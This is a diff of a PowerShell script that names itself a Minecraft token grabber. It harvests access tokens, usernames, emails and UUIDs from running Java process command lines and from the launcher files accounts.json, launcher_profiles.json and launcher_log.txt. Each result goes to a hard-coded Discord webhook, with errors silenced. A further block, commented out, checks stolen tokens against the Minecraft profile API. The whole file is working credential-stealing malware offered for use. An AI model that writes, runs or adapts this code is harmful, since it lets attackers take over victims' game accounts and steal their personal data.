@@ -1,133 +1,148 @@
 $webhookUrl = "https://discord.com/api/webhooks/1508519789566496950/B3L__pijUlyH20EfneD3XeA2CwwzCw0HteEze4taaUyxD1txNgPF2BwVXgeJzG-3Ifme"
 
-# === FORCE CLOSE LAUNCHER FIRST (optional - unlocks logs) ===
-taskkill /f /im MinecraftLauncher.exe 2>$null
-taskkill /f /im "Minecraft: Java Edition.exe" 2>$null
+# Disable progress bar for faster execution
+$ProgressPreference = 'SilentlyContinue'
 
-# === METHOD 1: Capture from running Java Minecraft client processes ===
-Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'java%' AND CommandLine LIKE '%accessToken%'" |
+# === SECTION 1: RUNNING JAVA PROCESSES ===
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
     Select-Object -ExpandProperty CommandLine |
     ForEach-Object {
-        $args = $_
-        
-        # Extract parameters using regex
         $accessToken = $null
         $username = $null
         $uuid = $null
         $userType = $null
         $version = $null
         $gameDir = $null
-        $assetsDir = $null
-        
-        if ($args -match '--accessToken\s+(\S+)') { $accessToken = $matches[1] }
-        if ($args -match '--username\s+(\S+)') { $username = $matches[1] }
-        if ($args -match '--uuid\s+(\S+)') { $uuid = $matches[1] }
-        if ($args -match '--userType\s+(\S+)') { $userType = $matches[1] }
-        if ($args -match '--version\s+(\S+)') { $version = $matches[1] }
-        if ($args -match '--gameDir\s+(\S+)') { $gameDir = $matches[1] }
-        if ($args -match '--assetsDir\s+(\S+)') { $assetsDir = $matches[1] }
-        
+        $ip = $null
+
+        if ($_ -match '--accessToken\s+(\S+)') { $accessToken = $matches[1] }
+        if ($_ -match '--username\s+(\S+)') { $username = $matches[1] }
+        if ($_ -match '--uuid\s+(\S+)') { $uuid = $matches[1] }
+        if ($_ -match '--userType\s+(\S+)') { $userType = $matches[1] }
+        if ($_ -match '--version\s+(\S+)') { $version = $matches[1] }
+        if ($_ -match '--gameDir\s+(\S+)') { $gameDir = $matches[1] }
+
         if ($accessToken -and $username) {
-            # Format message
             $message = @"
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-**MINECRAFT ACCESS TOKEN CAPTURED**
-**━━━━━━━━━━━━━━━━━━━━━━━━**
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+**MINECRAFT ACCESS TOKEN (JAVA PROCESS)**
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
 **Username:** $username
-**Access Token:** `$accessToken`
+**Access Token:** `$accessToken
 **UUID:** $uuid
 **User Type:** $userType
 **Version:** $version
 **Game Directory:** $gameDir
-**Assets Directory:** $assetsDir
 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-**━━━━━━━━━━━━━━━━━━━━━━━━**
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
 "@
             $payload = @{content = $message} | ConvertTo-Json -Depth 10
             try {
-                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
             } catch { }
         }
     }
 
-# === METHOD 2: Extract from launcher logs (Microsoft login) ===
+# === SECTION 2: ACCOUNTS.JSON ===
+$accountsPath = "$env:APPDATA\.minecraft\accounts.json"
+if (Test-Path $accountsPath) {
+    try {
+        $accounts = Get-Content $accountsPath -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json
+        if ($accounts.accounts) {
+            foreach ($acc in $accounts.accounts.PSObject.Properties) {
+                $profile = $acc.Value
+                $accessToken = $profile.accessToken
+                $username = $profile.username
+                $minecraftUsername = $profile.minecraftProfile.name
+                $minecraftUUID = $profile.minecraftProfile.id
+                
+                if ($accessToken) {
+                    $message = @"
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+**MINECRAFT ACCESS TOKEN (ACCOUNTS.JSON)**
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+**Access Token:** `$accessToken
+**Account Email/Username:** $username
+**Minecraft Username:** $minecraftUsername
+**Minecraft UUID:** $minecraftUUID
+**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+"@
+                    $payload = @{content = $message} | ConvertTo-Json
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
+                }
+            }
+        }
+    } catch { }
+}
+
+# === SECTION 3: LAUNCHER_PROFILES.JSON (legacy) ===
+$profilesPath = "$env:APPDATA\.minecraft\launcher_profiles.json"
+if (Test-Path $profilesPath) {
+    try {
+        $profiles = Get-Content $profilesPath -Raw -ErrorAction SilentlyContinue | ConvertFrom-Json
+        if ($profiles.authenticationDatabase) {
+            foreach ($auth in $profiles.authenticationDatabase.PSObject.Properties) {
+                $accessToken = $auth.Value.accessToken
+                $username = $auth.Value.username
+                $displayName = $auth.Value.displayName
+                $uuid = $auth.Value.uuid
+                
+                if ($accessToken -and $username) {
+                    $message = @"
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+**MINECRAFT ACCESS TOKEN (LAUNCHER_PROFILES.JSON)**
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+**Access Token:** `$accessToken
+**Username:** $displayName
+**Email/Account:** $username
+**UUID:** $uuid
+**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+"@
+                    $payload = @{content = $message} | ConvertTo-Json
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
+                }
+            }
+        }
+    } catch { }
+}
+
+# === SECTION 4: LAUNCHER_LOG.TXT ===
 $logPath = "$env:APPDATA\.minecraft\launcher_log.txt"
 if (Test-Path $logPath) {
-    $log = Get-Content $logPath -Raw -ErrorAction SilentlyContinue
-    # Extract Microsoft refresh token / access token
-    if ($log -match 'accessToken":"([^"]+)"') {
-        $msToken = $matches[1]
-        $message2 = @"
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-**MICROSOFT LAUNCHER TOKEN FOUND**
-**━━━━━━━━━━━━━━━━━━━━━━━━**
+    try {
+        $log = Get-Content $logPath -Raw -ErrorAction SilentlyContinue
+        if ($log -match 'accessToken":"([^"]+)"') {
+            $msToken = $matches[1]
+            $message = @"
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
+**MINECRAFT TOKEN (LAUNCHER_LOG.TXT)**
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
 **Token:** $msToken
 **Source:** launcher_log.txt
 **Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-**━━━━━━━━━━━━━━━━━━━━━━━━**
+**━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
 "@
-        $payload2 = @{content = $message2} | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload2 -ContentType "application/json" -ErrorAction SilentlyContinue
-    }
-}
-
-# === METHOD 3: Extract from Minecraft Launcher accounts.json (Microsoft auth) ===
-$accountsPath = "$env:APPDATA\.minecraft\accounts.json"
-if (Test-Path $accountsPath) {
-    $accounts = Get-Content $accountsPath -Raw | ConvertFrom-Json
-    if ($accounts.accounts) {
-        foreach ($acc in $accounts.accounts.PSObject.Properties) {
-            $profile = $acc.Value
-            $minecraftUsername = $profile.minecraftProfile.name
-            $minecraftUUID = $profile.minecraftProfile.id
-            $accessTok = $profile.accessToken
-            $userNam = $profile.username
-            
-            $message3 = @"
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-**ACCOUNTS.JSON CAPTURED**
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-**Minecraft Username:** $minecraftUsername
-**Minecraft UUID:** $minecraftUUID
-**Access Token:** $accessTok
-**Account Email/Username:** $userNam
-**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-"@
-            $payload3 = @{content = $message3} | ConvertTo-Json
-            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload3 -ContentType "application/json" -ErrorAction SilentlyContinue
+            $payload = @{content = $message} | ConvertTo-Json
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
         }
-    }
+    } catch { }
 }
 
-# === METHOD 4: Extract from launcher_profiles.json (legacy launcher) ===
-$profilesPath = "$env:APPDATA\.minecraft\launcher_profiles.json"
-if (Test-Path $profilesPath) {
-    $profiles = Get-Content $profilesPath -Raw | ConvertFrom-Json
-    if ($profiles.authenticationDatabase) {
-        foreach ($auth in $profiles.authenticationDatabase.PSObject.Properties) {
-            $accessTok = $auth.Value.accessToken
-            $userNam = $auth.Value.username
-            $displayName = $auth.Value.displayName
-            $uuid = $auth.Value.uuid
-            
-            if ($accessTok -and $userNam) {
-                $message4 = @"
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-**LAUNCHER_PROFILES.JSON CAPTURED**
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-**Username:** $displayName ($userNam)
-**UUID:** $uuid
-**Access Token:** $accessTok
-**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-**━━━━━━━━━━━━━━━━━━━━━━━━**
-"@
-                $payload4 = @{content = $message4} | ConvertTo-Json
-                Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload4 -ContentType "application/json" -ErrorAction SilentlyContinue
-            }
-        }
+# === SECTION 5: VALIDATE TOKENS (optional - tests if token works) ===
+# This uses the Mojang API to check token validity
+# Uncomment to enable
+<#
+$apiUrl = "https://api.minecraftservices.com/minecraft/profile"
+$headers = @{Authorization = "Bearer $accessToken"}
+try {
+    $profile = Invoke-RestMethod -Uri $apiUrl -Headers $headers -ErrorAction SilentlyContinue
+    if ($profile) {
+        $validMsg = @{content = "**Token Valid:** $($profile.name) ($($profile.id))"} | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $validMsg -ContentType "application/json"
     }
-}
+} catch { }
+#>
 
-# === VALIDATE TOKENS (check if still active) ===
-# Can be used to test each extracted token against Mojang API
+Write-Host "Minecraft token grabber completed."
